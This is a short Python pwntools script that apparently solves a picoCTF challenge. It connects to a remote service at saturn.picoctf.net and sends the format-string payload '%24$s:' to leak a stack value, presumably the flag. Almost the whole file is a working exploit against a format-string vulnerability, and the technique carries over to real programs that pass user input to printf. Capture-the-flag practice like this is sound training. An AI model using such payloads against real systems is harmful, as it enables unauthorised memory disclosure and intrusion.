#!/usr/bin/env python3

from sys import argv
from pwn import *

if len(argv) < 2:
    print("Usage: ./sol [PORT]")
    exit()

ip = "saturn.picoctf.net"
port = int(argv[1])

context.log_level = "error"
r = remote(ip, port)

z = r.recvuntil(b">> ").decode()
print(z)

# Reference: https://resources.infosecinstitute.com/topic/how-to-exploit-format-string-vulnerabilities/
response = "%24$s:"
r.sendline(response.encode())

z = r.recvline().decode()
print(z)
z = r.recvline().decode()
print(z)

